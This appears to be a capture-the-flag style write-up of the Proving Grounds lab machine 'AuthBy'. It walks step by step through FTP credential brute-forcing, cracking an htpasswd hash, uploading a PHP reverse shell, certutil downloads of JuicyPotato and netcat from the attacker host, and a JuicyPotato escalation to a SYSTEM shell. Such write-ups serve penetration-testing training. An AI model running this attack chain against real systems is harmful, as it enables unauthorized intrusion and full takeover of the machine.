---
layout: post
title: PG | AuthBy
subtitle: Enumeratation and pillaging like bandits in the old country.
---

# Nmap Scan Results

~~~
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 10:26 UTC
Nmap scan report for 192.168.182.46
Host is up (0.015s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Oct 26 17:27 log
| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Feb 18  2023 accounts
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
|_http-title: 401 Authorization Required
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2023-10-26T10:28:22+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2023-10-26T10:28:17+00:00
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2023-01-28T03:26:23
|_Not valid after:  2023-07-30T03:26:23
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.49 seconds
~~~

# Service Enumeration

## FTP (TCP/21)
The FTP server allows Anonymous authentication, however after pulling all anonymously accessible files from the FTP server there is nothing interesting

~~~shell
┌──(kali㉿kali)-[~/Desktop/AuthBy]
└─$ wget -m ftp://anonymous:anonymous@192.168.182.46
~~~

In the Nmap scan we see there are other files stored on the FTP server so we can attempt to brute force using Hydra for login credentials with greater privileges

![AuthBy](/assets/img/AuthByPG(1).png)

We can then re-run the wget command to retrieve all files available to the admin:admin account

~~~shell
┌──(kali㉿kali)-[~/Desktop/AuthBy]
└─$ wget -m ftp://admin:admin@192.168.182.46
~~~

We recieve index.php, .htaccess and .htpasswd files

~~~shell
-rw-r--r-- 1 kali kali  161 Nov  8  2011 .htaccess
-rw-r--r-- 1 kali kali   45 Nov  8  2011 .htpasswd
-rw-r--r-- 1 kali kali   76 Nov  8  2011 index.php
~~~

The .htaccess file shows the configuration set to allow users to access an Apache Wamp web server that prompts for authentication that matches the .htpasswd file
~~~shell
┌──(kali㉿kali)-[~/Desktop/AuthBy/192.168.182.46]
└─$ cat .htaccess
AuthName "Qui e nuce nuculeum esse volt, frangit nucem!"
AuthType Basic
AuthUserFile c:\\wamp\www\.htpasswd
<Limit GET POST PUT>
Require valid-user
</Limit>
~~~ 

The .htpasswd file displays a user 'offsec' and an encrypted password
~~~shell
┌──(kali㉿kali)-[~/Desktop/AuthBy/192.168.182.46]
└─$ cat .htpasswd
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
~~~

I used john to crack the password by storing the password hash in a file named offsec.txt then running a bruteforce hash crack against a wordlist which suceeded in recieving the password 'elite'

![AuthBy](/assets/img/AuthByPG(2).png)

## HTTP (TCP/242)

As expected when entering the Apache website hosted on port 242 we are prompted for user authentication as shown below, and granted access upon entering the credentials offsec:elite

![AuthBy](/assets/img/AuthByPG(3).png)

I then performed a gobuster sub-directory scan passing the credentials offsec:elite
~~~shell
┌──(kali㉿kali)-[~/Desktop/AuthBy]
└─$ gobuster dir -U offsec -P elite -u http://192.168.182.46:242/ -w /usr/share/dirb/wordlists/common.txt -x .txt, .php -t 30 
~~~
This did not reveal any avaiable webpages, however it did verify that both .htpasswd and .htaccess from the FTP server are stored within the web directory, this means if we store a reverse shell on the FTP server, we should be able to call it by navigating to it on the website

![AuthBy](/assets/img/AuthByPG(4).png)

I then stored [this](https://github.com/Dhayalanb/windows-php-reverse-shell) windows php reverse shell on the FTP server changing the IP, Port and tmpdir

![AuthBy](/assets/img/AuthByPG(5).png)

![AuthBy](/assets/img/AuthByPG(6).png)

~~~shell
┌──(kali㉿kali)-[~/Desktop/AuthBy]
└─$ ftp admin@192.168.182.46     
Connected to 192.168.182.46.
220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
331 User name received, need password.
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put revshell.php
local: revshell.php remote: revshell.php
229 Entering Extended Passive Mode (|||2100|)
150 File status okay; about to open data connection.
100% |********************************************************************************************************************************|  6542       73.39 MiB/s    00:00 ETA
226 Closing data connection.
6542 bytes sent in 00:00 (115.52 KiB/s)
~~~

I started my listener

~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4443
listening on [any] 4443 ...
~~~

And navigated to my uploaded shell to execute it at http://192.168.182.46:242/revshell.php

Then I recieved a connection back on my listener, and got the initial foothold!

~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4443
listening on [any] 4443 ...
connect to [192.168.45.228] from (UNKNOWN) [192.168.182.46] 49158
b374k shell : connected

Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\wamp\www>whoami
whoami
livda\apache
~~~

# Privilege Escalation

After running the 'systeminfo' command when first accessing the target machine, the machine is running Windows Server 2008 with no Hotfixes, which is known to be vulnerable to a wide array of exploits.

![AuthBy](/assets/img/AuthByPG(7).png)

For this privilege escalation I used [JuicyPotato](https://github.com/ivanitlearning/Juicy-Potato-x86/releases) as discussed in this [post](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato) JuicyPotato can be used to target any Class IDs which are serial numbers that represents a globally unique identifier for any application component in Windows. Therefore we can execute commands with the privileges of another application with NT Authority/System privileges to create a reverse shell and grant us a root(system) shell

Transfer JuicyPotato and nc.exe(netcat) to target machine
~~~shell
┌──(kali㉿kali)-[~/Desktop/AuthBy]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~
~~~shell
C:\wamp\www>certutil.exe -urlcache -split -f "http://192.168.45.228/Juicy.Potato.x86.exe"
certutil.exe -urlcache -split -f "http://192.168.45.228/Juicy.Potato.x86.exe"
****  Online  ****
CertUtil: -URLCache command completed successfully.
~~~
~~~shell
C:\wamp\www>certutil.exe -urlcache -split -f "http://192.168.45.228/nc.exe"
certutil.exe -urlcache -split -f "http://192.168.45.228/nc.exe"
****  Online  ****
CertUtil: -URLCache command completed successfully.
~~~
Create listener on port 443
~~~shell
┌──(kali㉿kali)-[~/Desktop/AuthBy]
└─$ nc -nvlp 443
listening on [any] 443 ...
~~~

Execute JuicyPotato to connect to our netcat listener specifying a CLSID to impersonate from [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise) (I used {9B1F122C-2982-4e91-AA8B-E071D54F2A4D})

![AuthBy](/assets/img/AuthByPG(8).png)

And we recieve our root(system) shell!

~~~shell
┌──(kali㉿kali)-[~/Desktop/AuthBy]
└─$ nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.45.228] from (UNKNOWN) [192.168.182.46] 49175
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
~~~